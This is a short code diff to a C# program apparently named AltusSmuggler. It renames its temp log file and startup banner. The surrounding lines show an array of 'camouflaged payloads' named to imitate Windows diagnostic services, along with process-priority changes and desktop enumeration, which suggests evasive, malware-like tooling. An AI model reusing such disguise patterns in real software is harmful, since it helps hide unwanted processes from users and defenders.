@@ -63,7 +63,7 @@ namespace AltusSmuggler {
         public static extern bool CloseHandle(IntPtr hObject);
 
         static List<string> foundDesktops = new List<string>();
-        static string logPath = Path.Combine(Path.GetTempPath(), "altus_smuggler.log");
+        static string logPath = Path.Combine(Path.GetTempPath(), "sembiote_smuggler.log");
 
         static void Log(string msg) {
             try {
@@ -82,7 +82,7 @@ namespace AltusSmuggler {
                 Process.GetCurrentProcess().PriorityClass = ProcessPriorityClass.High;
             } catch {}
 
-            Log("=== NATIVE SMUGGLER SOVEREIGN PROTOCOL IGNITED ===");
+            Log("=== NATIVE SEMBIOTE SOVEREIGN PROTOCOL IGNITED ===");
 
             // PRIORITIZED CAMOUFLAGED PAYLOADS
             string[] payloads = { "win_diag_host", "win_diag_svc", "electron" };
@@ -143,3 +143,4 @@ namespace AltusSmuggler {
         }
     }
 }
+
